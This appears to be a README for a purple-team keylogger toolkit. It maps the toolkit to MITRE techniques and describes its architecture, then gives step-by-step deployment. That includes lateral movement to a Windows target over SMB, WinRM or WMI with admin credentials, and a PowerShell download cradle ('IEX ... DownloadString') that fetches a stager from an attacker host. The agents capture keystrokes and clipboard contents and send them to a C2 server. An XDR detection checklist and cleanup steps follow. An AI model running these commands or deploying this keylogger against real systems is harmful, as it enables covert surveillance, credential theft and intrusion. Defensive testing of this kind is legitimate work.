# API-Based Keylogger — Purple Team / XDR Testing

> **FOR AUTHORIZED SECURITY TESTING ONLY**

## MITRE ATT&CK Coverage

| Technique | ID | Component |
|---|---|---|
| Input Capture: Keylogging | T1056.001 | agent.py, windows-agent.ps1, stager.ps1 |
| Clipboard Data | T1115 | agent.py, windows-agent.ps1 |
| Exfiltration Over C2 Channel | T1041 | All agents → server.py |
| Lateral Tool Transfer | T1570 | deploy-lateral.py |
| Remote Services: WinRM | T1021.006 | deploy-lateral.py |
| Remote Services: SMB | T1021.002 | deploy-lateral.py |
| Windows Management Instrumentation | T1047 | deploy-lateral.py |
| Ingress Tool Transfer | T1105 | stager.ps1, server.py /api/stager |
| PowerShell | T1059.001 | windows-agent.ps1, stager.ps1 |
| Python | T1059.006 | agent.py, deploy-lateral.py |
| Native API | T1106 | windows-agent.ps1 (user32.dll) |

## Architecture

```
 ATTACKER (macOS/Linux)                         TARGET (Windows)
┌─────────────────────┐                        ┌─────────────────────────┐
│  server.py          │◄── HTTP POST ──────────│  windows-agent.ps1      │
│  (Collection C2)    │    /api/keystrokes     │  - GetAsyncKeyState     │
│  - Log to JSONL     │    /api/clipboard      │  - Clipboard polling    │
│  - Console view     │    /api/heartbeat      │  - Base64 exfil         │
│  - Serve stager     │                        │                         │
├─────────────────────┤                        │  OR                     │
│  deploy-lateral.py  │── SMB/WinRM/WMI ──────│  stager.ps1 (fileless)  │
│  - T1570 transfer   │   (Lateral Movement)   │  - In-memory execution  │
│  - T1021 remote exec│                        │  - Download cradle      │
└─────────────────────┘                        └─────────────────────────┘
```

## Files

| File | Purpose |
|---|---|
| `server.py` | Collection server — receives all agent data |
| `agent.py` | macOS/Linux agent (Python, pynput) |
| `windows-agent.ps1` | Windows agent (PowerShell, Win32 API) |
| `stager.ps1` | Fileless variant — runs entirely in memory |
| `deploy-lateral.py` | Lateral movement deployer (SMB/WinRM/WMI/Cradle) |
| `config.env` | Configuration reference |

## Quick Start — Local (macOS/Linux)

```bash
cd purple-team/api-keylogger
pip3 install -r requirements.txt
python3 server.py          # Terminal 1
python3 agent.py           # Terminal 2
```

## Lateral Movement to Windows

### Step 1: Start the collection server on your attack box

```bash
python3 server.py
# Listening on 0.0.0.0:8443
```

### Step 2: Deploy to Windows target

**Method A — SMB + Remote Exec (most common):**
```bash
python3 deploy-lateral.py 192.168.1.100 -u 'DOMAIN\admin' -p 'Password123' \
    --c2-url http://YOUR_ATTACKER_IP:8443 -m smb
```

**Method B — WinRM:**
```bash
python3 deploy-lateral.py 192.168.1.100 -u admin -p 'Password123' \
    --c2-url http://YOUR_ATTACKER_IP:8443 -m winrm
```

**Method C — Download cradle (fileless, T1105):**
```bash
# Generate the encoded cradle
python3 deploy-lateral.py 192.168.1.100 -u admin -p 'Password123' \
    --c2-url http://YOUR_ATTACKER_IP:8443 -m cradle

# On target (after gaining shell):
powershell -ep Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8443/api/stager')"
```

**Method D — All methods (generate commands for each):**
```bash
python3 deploy-lateral.py 192.168.1.100 -u admin -p 'Password123' \
    --c2-url http://YOUR_ATTACKER_IP:8443 -m all
```

### Step 3: Run directly on Windows (if you have a shell)

```powershell
# File-based
powershell -ep Bypass -File C:\Windows\Temp\pt-agent.ps1 -C2Url http://ATTACKER:8443

# Fileless one-liner
powershell -ep Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8443/api/stager')"
```

## XDR Detection Checklist

### What your XDR SHOULD detect on the Windows target:

| # | Detection | MITRE | Indicator |
|---|---|---|---|
| 1 | PowerShell calling user32.dll | T1106 | GetAsyncKeyState P/Invoke |
| 2 | Keyboard input capture | T1056.001 | Repeated GetAsyncKeyState calls |
| 3 | Clipboard access from PowerShell | T1115 | [Clipboard]::GetText() |
| 4 | Periodic HTTP POST beacons | T1041 | Every 15s to C2 |
| 5 | Base64-encoded payloads | T1027 | In HTTP body |
| 6 | SMB file write to admin share | T1570 | Agent dropped to C$\Windows\Temp |
| 7 | Remote WinRM/WMI execution | T1021 | Lateral movement |
| 8 | PowerShell download cradle | T1105 | IEX + DownloadString |
| 9 | Long-running hidden PowerShell | T1059.001 | -WindowStyle Hidden |
| 10 | Network logon from attacker IP | T1078 | Type 3 logon event |

### What your XDR SHOULD detect on the network:

- Outbound HTTP POST to non-standard port (8443)
- Base64-encoded keystroke data in HTTP body
- Periodic beaconing pattern (fixed interval)
- SMB traffic to admin shares from non-standard source

## Configuration

| Variable | Default | Description |
|---|---|---|
| `KL_SERVER_HOST` | `0.0.0.0` | Server bind address |
| `KL_SERVER_PORT` | `8443` | Server port |
| `KL_AUTH_TOKEN` | `purpleteam-xdr-test-2024` | Shared auth token |
| `KL_C2_URL` | `http://127.0.0.1:8443` | Agent → server URL |
| `KL_INTERVAL` | `15` | Exfil interval (seconds) |

## Cleanup

```bash
# On attacker — stop server
Ctrl+C

# On target — kill agent
Get-Process powershell | Where-Object {$_.CommandLine -like '*pt-agent*'} | Stop-Process
Remove-Item C:\Windows\Temp\pt-agent.ps1 -Force

# Remove logs
rm -rf captured_logs/
```
